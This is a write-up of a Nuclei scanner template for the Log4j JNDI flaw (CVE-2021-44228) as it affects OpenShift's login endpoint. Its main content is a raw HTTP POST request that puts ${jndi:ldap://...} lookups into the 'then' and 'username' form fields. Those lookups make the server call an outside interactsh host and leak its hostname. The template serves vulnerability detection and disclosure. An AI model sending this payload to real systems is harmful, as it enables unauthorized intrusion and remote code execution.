# Nuclei Template: OpenShift - Remote Code Execution (Apache Log4j)
**Template ID:** openshift-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`openshift-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
OpenShift is susceptible to Log4j JNDI remote code execution. OpenShift is a unified platform to build, modernize, and deploy applications at scale.

## Steps to reproduce / Exploit Payload
```http
POST /Login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/login?then=/oauth/authorize?client_id=openshift-web-console&idp=basic&redirect_uri={{BaseURL}}/console/oauth&response_type
Content-Type: application/x-www-form-urlencoded

then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3D${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}26response_type%3Dcode&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
```

## References
- https://access.redhat.com/security/cve/cve-2021-44228
